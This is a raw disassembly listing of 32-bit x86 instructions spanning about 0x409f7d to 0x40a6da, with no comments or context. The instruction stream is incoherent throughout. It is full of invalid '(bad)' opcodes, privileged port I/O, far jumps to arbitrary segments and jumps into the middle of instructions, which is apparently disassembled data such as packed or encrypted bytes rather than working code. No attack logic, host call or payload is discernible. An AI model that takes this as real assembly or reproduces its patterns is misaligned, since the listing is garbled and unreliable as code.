  409f7d:	fs jmp 0x9a4cbed2
  409f83:	mov    ch,0x1f
  409f85:	sbb    al,0x3f
  409f87:	mov    dl,0xb6
  409f89:	add    DWORD PTR [edx],ebx
  409f8b:	pop    ss
  409f8c:	retf   0x9bcd
  409f8f:	xchg   DWORD PTR [ebp-0x33],esp
  409f92:	fimul  DWORD PTR [edi-0x5b]
  409f95:	xchg   esi,eax
  409f96:	dec    ecx
  409f97:	jno    0x40a015
  409f99:	sti    
  409f9a:	pusha  
  409f9b:	cmp    eax,0x2e842fc8
  409fa1:	dec    ecx
  409fa2:	mov    ds:0x2aef66a6,eax
  409fa7:	mov    bh,0xba
  409fa9:	(bad)  
  409faa:	shr    BYTE PTR [ebx+edi*2-0xf],cl
  409fae:	push   cs
  409faf:	fwait
  409fb0:	aaa    
  409fb1:	xor    eax,0xfe43f18f
  409fb6:	jnp    0x409f9a
  409fb8:	mov    ?,WORD PTR [esi]
  409fba:	mov    eax,0xd96d4361
  409fbf:	adc    DWORD PTR [esp+ebx*4+0x60],0x53
  409fc4:	or     DWORD PTR [edi+ebp*1],ebx
  409fc7:	lahf   
  409fc8:	retf   0xf353
  409fcb:	ror    dh,1
  409fcd:	dec    ecx
  409fce:	and    DWORD PTR [esi+0x23],ebx
  409fd1:	dec    ecx
  409fd2:	jp     0x409f91
  409fd4:	imul   esp,esi,0x24
  409fd7:	sahf   
  409fd8:	lea    edx,[ebp+0x63]
  409fdb:	mov    edi,0x627acc28
  409fe0:	pop    esi
  409fe1:	cdq    
  409fe2:	push   0x653bf3b8
  409fe7:	cwde   
  409fe8:	xchg   edx,eax
  409fe9:	retf   0x2925
  409fec:	or     bh,0x65
  409fef:	jmp    0x409fe9
  409ff1:	fistp  QWORD PTR [ebp+0x4c]
  409ff4:	dec    ebx
  409ff5:	pop    ebp
  409ff6:	mov    ch,0x25
  409ff8:	hlt    
  409ff9:	ret    0x5aa8
  409ffc:	xor    al,ah
  409ffe:	push   0xffffffc2
  40a000:	idiv   BYTE PTR [eax+0x58]
  40a003:	sti    
  40a004:	inc    edx
  40a005:	add    al,ah
  40a007:	sti    
  40a008:	mov    al,0x2f
  40a00a:	xchg   edi,eax
  40a00b:	add    al,dh
  40a00d:	xchg   ebx,eax
  40a00e:	in     al,dx
  40a00f:	repz aaa 
  40a011:	or     eax,0x1164be85
  40a016:	mov    esi,0xf2856c4a
  40a01b:	mov    bh,0x10
  40a01d:	lods   eax,DWORD PTR ds:[esi]
  40a01e:	hlt    
  40a01f:	or     BYTE PTR [edx-0x57f55698],cl
  40a025:	xchg   edi,eax
  40a026:	add    cl,al
  40a028:	fbld   TBYTE PTR [edx-0x7e08b8bd]
  40a02e:	popa   
  40a02f:	call   0x25530efb
  40a034:	fld    st(2)
  40a036:	loop   0x40a011
  40a038:	cmp    cl,bl
  40a03a:	push   eax
  40a03b:	mov    eax,ds:0x2c402c90
  40a040:	cmp    edi,DWORD PTR [ebx+eiz*8+0x79]
  40a044:	sbb    BYTE PTR [ebx],ah
  40a046:	jg     0x40a0ae
  40a048:	in     al,dx
  40a049:	push   esp
  40a04a:	jl     0x40a01b
  40a04c:	jno    0x40a0b8
  40a04e:	addr16 or eax,0x9c715677
  40a054:	or     ebx,ecx
  40a056:	(bad)  
  40a057:	sbb    BYTE PTR [ebx+0x19],dl
  40a05a:	and    edi,ecx
  40a05c:	pop    esp
  40a05d:	jns    0x40a09e
  40a05f:	lahf   
  40a060:	call   0x2627de62
  40a065:	xchg   BYTE PTR ds:0x8e596a45,bh
  40a06b:	cdq    
  40a06c:	jae    0x40a063
  40a06e:	test   DWORD PTR [edx+edi*4],edi
  40a071:	lods   eax,DWORD PTR ds:[esi]
  40a072:	mov    ecx,gs
  40a074:	(bad)  
  40a075:	jns    0x40a086
  40a077:	test   DWORD PTR [ebx+ebx*8],esp
  40a07a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a07b:	push   cs
  40a07c:	cdq    
  40a07d:	push   cs
  40a07e:	cdq    
  40a07f:	inc    ecx
  40a080:	jno    0x40a07c
  40a082:	sub    dh,cl
  40a084:	mov    ch,0x72
  40a086:	mov    eax,0x9c4c29f4
  40a08b:	mov    ds:0x6f9a8b20,al
  40a090:	xchg   esi,eax
  40a091:	xor    BYTE PTR [esp+edi*2-0x296eb91c],ah
  40a098:	pop    ebx
  40a099:	ret    
  40a09a:	clc    
  40a09b:	jle    0x40a02f
  40a09d:	mov    bh,0x68
  40a09f:	adc    edi,DWORD PTR [eax-0x6a]
  40a0a2:	pop    edx
  40a0a3:	outs   dx,BYTE PTR ds:[esi]
  40a0a4:	add    eax,0xb9f164b2
  40a0a9:	push   es
  40a0aa:	ret    0x71eb
  40a0ad:	bound  edx,QWORD PTR [edx-0x7e]
  40a0b0:	dec    edi
  40a0b1:	add    al,0xb7
  40a0b3:	and    bl,BYTE PTR [ebx]
  40a0b5:	xchg   ebp,eax
  40a0b6:	pop    ebx
  40a0b7:	cmp    eax,0x3f1fe53e
  40a0bc:	(bad)  
  40a0be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a0bf:	push   cs
  40a0c0:	loope  0x40a127
  40a0c2:	xchg   edx,eax
  40a0c3:	sub    ch,BYTE PTR [edx+eiz*4+0x13413d48]
  40a0ca:	test   DWORD PTR [ecx],esi
  40a0cc:	sbb    al,0x5d
  40a0ce:	push   ecx
  40a0cf:	int3   
  40a0d0:	cmp    cl,ah
  40a0d2:	lea    ebx,[ebp-0x45ec9064]
  40a0d8:	int    0xa
  40a0da:	sub    BYTE PTR [ebx],bl
  40a0dc:	daa    
  40a0dd:	xchg   esp,eax
  40a0de:	arpl   WORD PTR [ebx+0x458c23f2],di
  40a0e4:	je     0x40a130
  40a0e6:	jge    0x40a15c
  40a0e8:	cld    
  40a0e9:	sbb    BYTE PTR [edx-0x783e0a5d],dh
  40a0ef:	stos   BYTE PTR es:[edi],al
  40a0f0:	sbb    eax,0xe1e2abbd
  40a0f5:	mov    dl,0xd0
  40a0f7:	add    DWORD PTR [ecx+0x6b6cfef4],esi
  40a0fd:	jo     0x40a089
  40a0ff:	jnp    0x40a0b2
  40a101:	test   BYTE PTR [ebx+0x7b5a39ad],al
  40a107:	ds loop 0x40a106
  40a10a:	sub    ah,BYTE PTR [ecx-0x28]
  40a10d:	inc    ebx
  40a10e:	dec    edi
  40a10f:	or     esi,DWORD PTR [ebp-0x15]
  40a112:	pushf  
  40a113:	xchg   esi,eax
  40a114:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a115:	mov    ds:0x88df6c59,eax
  40a11a:	sub    dl,ah
  40a11c:	sbb    ah,BYTE PTR [ebx]
  40a11e:	jo     0x40a18d
  40a120:	pop    ds
  40a121:	pop    ebp
  40a122:	sub    DWORD PTR [esi],ebx
  40a124:	or     ah,ch
  40a126:	inc    ecx
  40a127:	push   ecx
  40a128:	cmp    eax,0x25027764
  40a12d:	xchg   ebp,eax
  40a12e:	scas   eax,DWORD PTR es:[edi]
  40a12f:	xrelease mov BYTE PTR [edx+0x40],0xf1
  40a134:	cmc    
  40a135:	inc    edx
  40a136:	(bad)  
  40a137:	xor    eax,0xfa65fa4e
  40a13c:	adc    dh,BYTE PTR [ecx-0x69]
  40a13f:	ficom  WORD PTR [edx]
  40a141:	bound  edi,QWORD PTR [edx+0x70]
  40a144:	mov    bh,0x2
  40a146:	mov    ch,0x9d
  40a148:	cli    
  40a149:	or     al,0x7f
  40a14b:	inc    ebx
  40a14c:	sub    al,0x5b
  40a14e:	xchg   edi,eax
  40a14f:	add    cl,bh
  40a151:	mov    esp,0x1537a4fe
  40a156:	rcl    BYTE PTR [edi-0x52],0x82
  40a15a:	cmp    edx,DWORD PTR [edx+0x31]
  40a15d:	xor    al,0x7e
  40a15f:	popf   
  40a160:	lods   eax,DWORD PTR ds:[esi]
  40a161:	jecxz  0x40a143
  40a163:	pop    ss
  40a164:	or     eax,0x75730d80
  40a169:	jmp    0x40a14d
  40a16b:	test   ecx,0x8215d181
  40a171:	in     al,0x3b
  40a173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a174:	mov    cl,0xc9
  40a176:	(bad)  
  40a177:	loope  0x40a158
  40a179:	cmp    al,0x79
  40a17b:	cmp    dh,BYTE PTR [edx-0x4d]
  40a17e:	push   0xffffffe4
  40a180:	and    eax,0x21ae00e5
  40a185:	and    edx,DWORD PTR [ebx+0x5a]
  40a188:	dec    esp
  40a189:	bound  ebp,QWORD PTR [ebp-0x4c]
  40a18c:	mov    bl,0x1b
  40a18e:	xor    ah,cl
  40a190:	enter  0xc951,0xba
  40a194:	sub    eax,0x9f1605c8
  40a199:	loope  0x40a134
  40a19b:	mov    esi,0x1cf66bd5
  40a1a0:	or     DWORD PTR [ebx+0xb],eax
  40a1a3:	jo     0x40a1af
  40a1a5:	mov    eax,0x2ebd2655
  40a1aa:	mov    dh,0x6
  40a1ac:	les    esi,FWORD PTR [ebp+0x56]
  40a1af:	das    
  40a1b0:	xlat   BYTE PTR ds:[ebx]
  40a1b1:	addr16 mov edx,edi
  40a1b4:	out    0x0,al
  40a1b6:	push   esp
  40a1b7:	dec    edx
  40a1b8:	adc    eax,0x1f9a18e8
  40a1bd:	std    
  40a1be:	(bad)  [ebp+0x4ea450c4]
  40a1c5:	pop    eax
  40a1c6:	and    eax,0x46b40304
  40a1cb:	stos   DWORD PTR es:[edi],eax
  40a1cc:	in     eax,dx
  40a1cd:	or     eax,0xd7619992
  40a1d2:	add    eax,0xde5a37c1
  40a1d7:	jge    0x40a240
  40a1d9:	mov    dh,0x24
  40a1db:	add    edi,edx
  40a1dd:	outs   dx,BYTE PTR ds:[esi]
  40a1de:	shl    ch,cl
  40a1e0:	js     0x40a212
  40a1e2:	push   es
  40a1e3:	push   es
  40a1e4:	or     DWORD PTR [edi+ebx*8-0x6effac92],ecx
  40a1eb:	cmc    
  40a1ec:	push   ds
  40a1ed:	push   ebp
  40a1ee:	shl    DWORD PTR [edx+0x36],1
  40a1f1:	psubsb mm4,QWORD PTR [edx+0x15]
  40a1f5:	and    BYTE PTR [ecx+0x2caacedb],bl
  40a1fb:	sar    bh,cl
  40a1fd:	out    0x44,al
  40a1ff:	cmp    al,0x9d
  40a201:	fsubrp st(5),st
  40a203:	mov    edi,0xd37d941e
  40a208:	test   al,0xd4
  40a20a:	push   edx
  40a20b:	repz xor BYTE PTR [eax+edx*2-0x44f92b79],bh
  40a213:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a214:	pop    ebx
  40a215:	retf   0x803d
  40a218:	add    DWORD PTR [ecx],esi
  40a21a:	icebp  
  40a21b:	mov    al,0xa4
  40a21d:	jns    0x40a22e
  40a21f:	mov    bh,0x5
  40a221:	stc    
  40a222:	xor    BYTE PTR [ebp+0x31],ah
  40a225:	popf   
  40a226:	arpl   WORD PTR [ebx],si
  40a228:	xor    edx,DWORD PTR [ebx]
  40a22a:	jb     0x40a227
  40a22c:	and    al,0xca
  40a22e:	ret    
  40a22f:	jae    0x40a1dc
  40a231:	outs   dx,DWORD PTR ds:[esi]
  40a232:	jae    0x40a1ff
  40a234:	mov    al,0xdc
  40a236:	xor    eax,0x5c6cc4c8
  40a23b:	into   
  40a23c:	das    
  40a23d:	mov    edx,0x9cc74d9b
  40a242:	ja     0x40a269
  40a244:	inc    esp
  40a245:	cmp    bh,BYTE PTR [edi+edx*1-0x63]
  40a249:	sub    eax,0x348dccc9
  40a24e:	cwde   
  40a24f:	adc    eax,0xa1f0e1bb
  40a254:	and    cl,BYTE PTR [esi+0x3f]
  40a257:	sub    ah,BYTE PTR [esi]
  40a259:	mov    dl,BYTE PTR ds:0xea87a240
  40a25f:	xchg   edx,eax
  40a260:	sub    DWORD PTR [ebx],0x28802bf1
  40a266:	xor    al,0xf8
  40a268:	bound  ebp,QWORD PTR [eax]
  40a26a:	and    al,0x7c
  40a26c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a26d:	pushf  
  40a26e:	dec    edi
  40a26f:	push   edx
  40a270:	scas   eax,DWORD PTR es:[edi]
  40a271:	scas   al,BYTE PTR es:[edi]
  40a272:	sub    edi,DWORD PTR [esi+ebx*1-0x78]
  40a276:	div    DWORD PTR [esi-0x4c]
  40a279:	add    al,0x5c
  40a27b:	cmp    eax,0x8aaf383f
  40a280:	lock outs dx,DWORD PTR ds:[esi]
  40a283:	push   esi
  40a284:	out    0x16,eax
  40a286:	ss popa 
  40a288:	in     al,dx
  40a289:	fs jmp 0x9c6b:0xb3bdddbd
  40a291:	dec    eax
  40a292:	enter  0x5010,0xd4
  40a296:	xchg   esi,eax
  40a297:	xchg   edx,eax
  40a298:	pop    edi
  40a299:	loopne 0x40a25a
  40a29b:	cmc    
  40a29c:	ror    DWORD PTR [edi-0x7e0c70],1
  40a2a2:	popa   
  40a2a3:	jg     0x40a27b
  40a2a5:	jle    0x40a29d
  40a2a7:	cmp    eax,0x97ba3f9d
  40a2ac:	xor    eax,edi
  40a2ae:	(bad)  
  40a2af:	or     eax,0x26bab1af
  40a2b4:	xor    eax,0x2f7fa6d
  40a2b9:	push   ebp
  40a2ba:	mov    eax,0xb0ee1e8d
  40a2bf:	or     ebp,DWORD PTR [esi]
  40a2c1:	xor    dh,al
  40a2c3:	sub    DWORD PTR [esi-0x29],ecx
  40a2c6:	pop    ds
  40a2c7:	cmp    al,0xe6
  40a2c9:	mov    BYTE PTR [eax-0x71],dh
  40a2cc:	jns    0x40a2b6
  40a2ce:	or     DWORD PTR [ebx-0x71734fc0],ecx
  40a2d4:	pushw  ss
  40a2d6:	rol    BYTE PTR [edi],0x8
  40a2d9:	pop    ds
  40a2da:	ja     0x40a2fa
  40a2dc:	cmp    eax,0xd34e447a
  40a2e1:	adc    bh,cl
  40a2e3:	popa   
  40a2e4:	sub    DWORD PTR [ecx],ecx
  40a2e6:	xor    DWORD PTR [ebx],0x19
  40a2e9:	stos   DWORD PTR es:[edi],eax
  40a2ea:	std    
  40a2eb:	pop    eax
  40a2ec:	mov    bl,0xd0
  40a2ee:	add    eax,0x3be7934e
  40a2f3:	rcr    DWORD PTR [edx],cl
  40a2f5:	xor    al,0x85
  40a2f7:	jno    0x40a295
  40a2f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2fa:	inc    esp
  40a2fb:	stos   DWORD PTR es:[edi],eax
  40a2fc:	or     BYTE PTR [ebx+0x1f06cd8e],0x8d
  40a303:	bound  esp,QWORD PTR [edx+0x75]
  40a306:	push   esi
  40a307:	sub    DWORD PTR [ebx],edx
  40a309:	fstp   QWORD PTR [edi]
  40a30b:	mov    eax,ds:0xd286a90f
  40a310:	popa   
  40a311:	adc    eax,0xea2bd38b
  40a316:	pandn  mm4,QWORD PTR [edi+ebx*2-0x1ed686a3]
  40a31e:	push   ebp
  40a31f:	sub    ebp,edi
  40a321:	push   ebp
  40a322:	test   BYTE PTR [eax-0x6c],cl
  40a325:	out    dx,eax
  40a326:	shr    bl,1
  40a328:	pop    esp
  40a329:	in     eax,dx
  40a32a:	ins    DWORD PTR es:[edi],dx
  40a32b:	ret    
  40a32c:	inc    edi
  40a32d:	retf   
  40a32e:	imul   esp,DWORD PTR [ebx],0xd0514c35
  40a334:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a335:	xor    DWORD PTR gs:[edi],ebp
  40a338:	mov    BYTE PTR [ecx+0xb],cl
  40a33b:	es jle 0x40a3a1
  40a33e:	sub    DWORD PTR [eax-0x38319d50],eax
  40a344:	pop    eax
  40a345:	jns    0x40a2e5
  40a347:	add    ecx,edx
  40a349:	imul   BYTE PTR [ebx-0x6b339830]
  40a34f:	xchg   esp,eax
  40a350:	std    
  40a351:	xor    ch,BYTE PTR [eax+0x17e31471]
  40a357:	sbb    DWORD PTR [ebx],ecx
  40a359:	jns    0x40a31f
  40a35b:	sub    BYTE PTR [ecx+edx*1+0x15eb1b7b],bl
  40a362:	aas    
  40a363:	out    dx,al
  40a364:	addr16 pop edi
  40a366:	add    dl,0xad
  40a369:	jmp    0xb8e3:0x3277ac81
  40a370:	outs   dx,BYTE PTR ds:[esi]
  40a371:	adc    BYTE PTR ds:[ebx-0x51a9f6f0],ah
  40a378:	cdq    
  40a379:	stos   BYTE PTR es:[edi],al
  40a37a:	xor    al,bh
  40a37c:	adc    DWORD PTR [esi+eax*2-0x430073e0],0xffffffd5
  40a384:	sbb    al,BYTE PTR [ebx+0x50]
  40a387:	fucomi st,st(7)
  40a389:	jmp    0xdb3:0xc9a8070c
  40a390:	out    0x2b,al
  40a392:	adc    eax,0x784aa69d
  40a397:	cmp    edi,edi
  40a399:	push   eax
  40a39a:	dec    esi
  40a39b:	or     cl,BYTE PTR [esi]
  40a39d:	and    BYTE PTR [ebx],bl
  40a39f:	xor    ch,bh
  40a3a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3a2:	repnz outs dx,BYTE PTR ds:[esi]
  40a3a4:	sti    
  40a3a5:	mov    ebp,0x1bc3740b
  40a3aa:	and    edi,ecx
  40a3ac:	inc    esp
  40a3ad:	xor    bh,BYTE PTR [ecx-0x59]
  40a3b0:	dec    BYTE PTR [edi-0x427c062c]
  40a3b6:	xchg   ecx,eax
  40a3b7:	jmp    0x16df26a4
  40a3bc:	add    BYTE PTR [edx+0x58362348],ch
  40a3c2:	mov    ?,WORD PTR [ebx-0x6ac3b668]
  40a3c8:	fs ds pop ss
  40a3cb:	pusha  
  40a3cc:	adc    eax,0xa8652ffb
  40a3d1:	icebp  
  40a3d2:	jge    0x40a3f3
  40a3d4:	xchg   esp,eax
  40a3d5:	jbe    0x40a42b
  40a3d7:	ds jbe 0x40a408
  40a3da:	mov    al,0xf3
  40a3dc:	fisubr WORD PTR [eax]
  40a3de:	inc    edi
  40a3df:	xchg   esi,eax
  40a3e0:	daa    
  40a3e1:	adc    ebp,esp
  40a3e3:	rcl    BYTE PTR [ecx+0x34],cl
  40a3e6:	mov    ecx,0xfeb37d46
  40a3eb:	aaa    
  40a3ec:	inc    eax
  40a3ed:	icebp  
  40a3ee:	mov    dh,0x97
  40a3f0:	push   ds
  40a3f1:	(bad)  [ecx+0x60]
  40a3f4:	xor    al,BYTE PTR [eax-0x11]
  40a3f7:	fincstp 
  40a3f9:	call   0x9d72298b
  40a3fe:	pop    edx
  40a3ff:	imul   esp,DWORD PTR [eax+edi*2-0x2c],0x0
  40a404:	sub    BYTE PTR [esi+eax*2-0x79],dl
  40a408:	jne    0x40a3b3
  40a40a:	test   BYTE PTR [ebp+0x42],bh
  40a40d:	sub    eax,0xc8cd04f0
  40a412:	into   
  40a413:	test   al,0x2a
  40a415:	mov    dh,0x78
  40a417:	inc    BYTE PTR [ecx+0x2b]
  40a41a:	mov    bl,bh
  40a41c:	das    
  40a41d:	ficom  WORD PTR [ecx]
  40a41f:	loopne 0x40a49e
  40a421:	pushf  
  40a422:	fsubp  st(1),st
  40a424:	push   ss
  40a425:	inc    edx
  40a426:	mov    al,ds:0xb1032519
  40a42b:	bound  ebp,QWORD PTR [edx+ebp*1+0x28e09e1a]
  40a432:	retf   0x7a46
  40a435:	pop    ds
  40a436:	inc    edi
  40a437:	inc    ebx
  40a438:	aas    
  40a439:	mov    ch,0x4f
  40a43b:	mov    ebp,DWORD PTR [edi-0x36]
  40a43e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a43f:	mov    esp,0x427dcc97
  40a444:	xlat   BYTE PTR cs:[ebx]
  40a446:	dec    esi
  40a447:	scas   eax,DWORD PTR es:[edi]
  40a448:	fdiv   DWORD PTR [edi+0x61]
  40a44b:	popfw  
  40a44d:	add    BYTE PTR [edi+eiz*2-0x14b6401b],dl
  40a454:	(bad)  
  40a455:	sti    
  40a456:	mov    esp,0xcb8d574c
  40a45b:	mov    ds:0x1f12ddf8,eax
  40a460:	pop    ebp
  40a461:	cs int3 
  40a463:	ret    0xfa68
  40a466:	dec    edx
  40a467:	cmc    
  40a468:	xchg   DWORD PTR [ecx+edi*8+0xb],ecx
  40a46c:	out    0xd2,al
  40a46e:	mov    bh,0xb6
  40a470:	jmp    0x40a441
  40a472:	mov    ah,0xc4
  40a474:	in     eax,0x93
  40a476:	cld    
  40a477:	cli    
  40a478:	xchg   edx,eax
  40a479:	ret    0xc7ca
  40a47c:	adc    bh,BYTE PTR [esi+esi*8+0x23]
  40a480:	xchg   ecx,eax
  40a481:	das    
  40a482:	sbb    al,0xaa
  40a484:	xchg   BYTE PTR [ecx-0x4e],cl
  40a487:	mov    ebx,0x353fe96b
  40a48c:	pop    ebp
  40a48d:	xor    eax,0xd4cd3e7a
  40a492:	add    eax,0x7f57a86c
  40a497:	sub    BYTE PTR [edx],bh
  40a499:	sub    BYTE PTR [edi+0x7c1ee5c9],al
  40a49f:	hlt    
  40a4a0:	repnz hlt 
  40a4a2:	inc    edi
  40a4a3:	cld    
  40a4a4:	jp     0x40a448
  40a4a6:	inc    ebx
  40a4a7:	fs mov edi,0x8afcced2
  40a4ad:	fldenv [edi+0x74]
  40a4b0:	xor    DWORD PTR [ebx+0x7c0325a],0x34
  40a4b7:	(bad)  
  40a4b9:	and    eax,0x89ef9ddf
  40a4be:	pop    ebp
  40a4bf:	jmp    0x1c7a:0x1da6d907
  40a4c6:	fdiv   DWORD PTR [edi]
  40a4c9:	test   DWORD PTR [bp+0x3818],edx
  40a4ce:	not    bl
  40a4d0:	pop    ecx
  40a4d1:	cmp    BYTE PTR [ebx+0x0],ah
  40a4d4:	push   edx
  40a4d5:	sahf   
  40a4d6:	pop    esp
  40a4d7:	dec    ebp
  40a4d8:	lock pop ebx
  40a4da:	add    al,0xb5
  40a4dc:	add    DWORD PTR [edx],ebx
  40a4de:	int3   
  40a4df:	scas   eax,DWORD PTR es:[edi]
  40a4e0:	sub    dl,BYTE PTR [edx-0x55]
  40a4e3:	mov    fs,WORD PTR ds:0xc3d4e781
  40a4e9:	ja     0x40a494
  40a4eb:	cmp    DWORD PTR [ebx],0xda4d7a86
  40a4f1:	mov    al,0xe5
  40a4f3:	push   edx
  40a4f4:	loop   0x40a537
  40a4f6:	xlat   BYTE PTR ds:[ebx]
  40a4f7:	icebp  
  40a4f8:	iret   
  40a4f9:	pushf  
  40a4fa:	adc    ecx,DWORD PTR [eax+0x71]
  40a4fd:	push   0x77
  40a4ff:	fwait
  40a500:	mov    ch,0x5f
  40a502:	jns    0x40a519
  40a504:	jnp    0x40a4cc
  40a506:	call   0xd270:0x4208368d
  40a50d:	and    DWORD PTR [ecx+edx*2+0x25a7dc88],esi
  40a514:	inc    esi
  40a515:	rol    ch,cl
  40a517:	and    al,BYTE PTR [esi+edx*4+0x61816c18]
  40a51e:	push   es
  40a51f:	sub    ch,BYTE PTR [ecx+0x27]
  40a522:	adc    edx,DWORD PTR [ebx]
  40a524:	jg     0x40a4bf
  40a526:	sub    BYTE PTR [edi-0x6d],bl
  40a529:	lds    ebp,FWORD PTR [eax+edx*8-0x74]
  40a52d:	test   DWORD PTR [edi-0x3e986d66],ebx
  40a533:	or     BYTE PTR [eax],0x13
  40a536:	int    0xcc
  40a538:	iret   
  40a539:	imul   cl
  40a53b:	add    dh,BYTE PTR [eax+0x8db9b06]
  40a541:	xchg   ebx,eax
  40a542:	xchg   ebx,eax
  40a543:	std    
  40a544:	call   0xfa8a51e6
  40a549:	xchg   edx,eax
  40a54a:	inc    DWORD PTR [esi]
  40a54c:	pop    ecx
  40a54d:	pop    esi
  40a54e:	or     BYTE PTR [edi-0x3652d2a9],ch
  40a554:	adc    dh,BYTE PTR [esi]
  40a556:	stos   BYTE PTR es:[edi],al
  40a557:	pop    es
  40a558:	mov    ah,0x5a
  40a55a:	mov    ?,edi
  40a55c:	or     ah,BYTE PTR [edi]
  40a55e:	xchg   edx,eax
  40a55f:	cmp    BYTE PTR ds:0xd122b2ea,cl
  40a565:	mov    dh,0x19
  40a567:	pop    esi
  40a568:	mov    ch,0xce
  40a56a:	adc    bl,BYTE PTR [edi-0x6d]
  40a56d:	es lahf 
  40a56f:	and    bh,0xa1
  40a572:	retf   
  40a573:	in     eax,0x22
  40a575:	jge    0x40a598
  40a577:	test   eax,0x25f3dec6
  40a57c:	adc    ecx,ecx
  40a57e:	rol    cl,0x37
  40a581:	jge    0x40a539
  40a583:	xchg   edi,eax
  40a584:	and    eax,0x77e2c24a
  40a589:	sbb    al,0xf6
  40a58b:	xor    ch,BYTE PTR [ebx-0x47]
  40a58e:	and    eax,0x10291b1e
  40a593:	sbb    ebx,esi
  40a595:	mov    esp,0x1f78118a
  40a59a:	pop    ecx
  40a59b:	imul   edx,DWORD PTR [ebx+0x71348450],0x51
  40a5a2:	cmp    al,BYTE PTR [esi+0x7d4715e7]
  40a5a8:	dec    eax
  40a5a9:	fdiv   QWORD PTR ds:[edx-0x54]
  40a5ad:	xchg   ebx,eax
  40a5ae:	test   eax,0xa2a922f5
  40a5b3:	lea    edi,[ebx]
  40a5b5:	retf   0xb0ae
  40a5b8:	adc    al,0xf9
  40a5ba:	(bad)  
  40a5bb:	jl     0x40a5d4
  40a5bd:	xchg   edi,eax
  40a5be:	mov    bl,0xee
  40a5c0:	push   cs
  40a5c1:	mul    ebx
  40a5c3:	add    BYTE PTR [eax+0x72cbb1d],ch
  40a5c9:	shr    BYTE PTR ds:0x360f0541,1
  40a5cf:	mov    ebx,0xf26299db
  40a5d4:	mov    edx,ds
  40a5d6:	ins    BYTE PTR es:[edi],dx
  40a5d7:	jmp    0xa7780a4f
  40a5dc:	test   bh,dh
  40a5de:	(bad)  
  40a5df:	not    al
  40a5e1:	mov    bh,BYTE PTR [edx]
  40a5e3:	xor    DWORD PTR [esi-0x6cc3b38e],eax
  40a5e9:	dec    ecx
  40a5ea:	ds int3 
  40a5ec:	std    
  40a5ed:	ror    BYTE PTR [ebp-0x67],1
  40a5f0:	stos   DWORD PTR es:[edi],eax
  40a5f1:	pop    eax
  40a5f2:	or     al,0xf2
  40a5f4:	mov    cs,WORD PTR [ebp+0x2916a551]
  40a5fa:	push   edx
  40a5fb:	cmp    BYTE PTR [edx+edx*2-0x35],dl
  40a5ff:	pop    ebp
  40a600:	and    eax,0x576683a6
  40a605:	stos   BYTE PTR es:[edi],al
  40a606:	outs   dx,DWORD PTR ds:[esi]
  40a607:	std    
  40a608:	test   DWORD PTR [esi+edx*2+0x7e],eax
  40a60c:	sub    al,dl
  40a60e:	pmaddwd mm4,QWORD PTR [esi]
  40a611:	daa    
  40a612:	and    eax,0xe94297fe
  40a617:	jle    0x40a629
  40a619:	jl     0x40a5b0
  40a61b:	cdq    
  40a61c:	xchg   edi,eax
  40a61d:	xchg   ecx,eax
  40a61e:	cmc    
  40a61f:	add    bl,ah
  40a621:	retf   0x4a9d
  40a624:	aam    0x1b
  40a626:	test   eax,0x2fa01fd4
  40a62b:	(bad)
  40a62e:	into   
  40a62f:	call   0xca88:0x89e98a83
  40a636:	(bad)  
  40a637:	fbstp  TBYTE PTR [edx-0x1a422675]
  40a63d:	ja     0x40a632
  40a63f:	and    al,BYTE PTR [edi]
  40a641:	fs mov edi,0x32586c9e
  40a647:	and    eax,0x5376c9fd
  40a64c:	xor    al,0xf9
  40a64e:	and    al,0x58
  40a651:	xor    DWORD PTR [esi],eax
  40a653:	sbb    eax,0x999e889a
  40a658:	pushf  
  40a659:	cs or  eax,0x48fc1a95
  40a65f:	and    bh,al
  40a661:	fistp  WORD PTR [edi]
  40a663:	arpl   bp,sp
  40a665:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a666:	je     0x40a6b3
  40a668:	fdivr  DWORD PTR [edx]
  40a66a:	fisub  DWORD PTR [ecx+0x26]
  40a66d:	mov    edi,DWORD PTR [edi+0x49]
  40a670:	and    bh,dh
  40a672:	int    0xd1
  40a674:	xchg   edi,edi
  40a676:	inc    BYTE PTR [ebx+0x48]
  40a679:	hlt    
  40a67a:	inc    ebx
  40a67b:	add    BYTE PTR [edi],ch
  40a67d:	push   ecx
  40a67e:	cmp    bh,BYTE PTR [edx]
  40a680:	adc    esp,esi
  40a682:	mov    edx,0xf8ccaeab
  40a687:	mov    ds:0xfa02d6a9,eax
  40a68c:	inc    ebp
  40a68d:	inc    eax
  40a68e:	jnp    0x40a687
  40a690:	cdq    
  40a691:	cwde   
  40a692:	sbb    bh,bh
  40a694:	pop    ebx
  40a696:	outs   dx,BYTE PTR ds:[esi]
  40a697:	mov    ch,0xfe
  40a699:	mov    esp,0x2be9764b
  40a69e:	pop    edx
  40a69f:	das    
  40a6a0:	dec    esi
  40a6a1:	sub    eax,0x8da488a4
  40a6a6:	leave  
  40a6a7:	cmp    dh,al
  40a6a9:	jp     0x40a6f2
  40a6ab:	mov    ebx,0x24f9a759
  40a6b0:	aam    0x20
  40a6b2:	push   ebp
  40a6b3:	push   edi
  40a6b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6b5:	mov    WORD PTR [esi],es
  40a6b7:	dec    esi
  40a6b8:	dec    ebp
  40a6b9:	jne    0x40a6dd
  40a6bb:	dec    edx
  40a6bc:	lahf   
  40a6bd:	pop    ds
  40a6be:	pop    esp
  40a6bf:	pop    eax
  40a6c0:	fcom   QWORD PTR [esi-0x587284c7]
  40a6c6:	scas   eax,DWORD PTR es:[edi]
  40a6c7:	sbb    BYTE PTR [ebx],dh
  40a6c9:	outs   dx,DWORD PTR ds:[esi]
  40a6ca:	and    ebp,esi
  40a6cc:	pop    edx
  40a6cd:	imul   esp,DWORD PTR [eax],0x77
  40a6d0:	mov    bl,0x2
  40a6d2:	arpl   WORD PTR [ecx-0x743afacd],sp
  40a6d8:	xchg   esp,esi
  40a6da:	adc    ebp,DWORD PTR [edi-0x40]
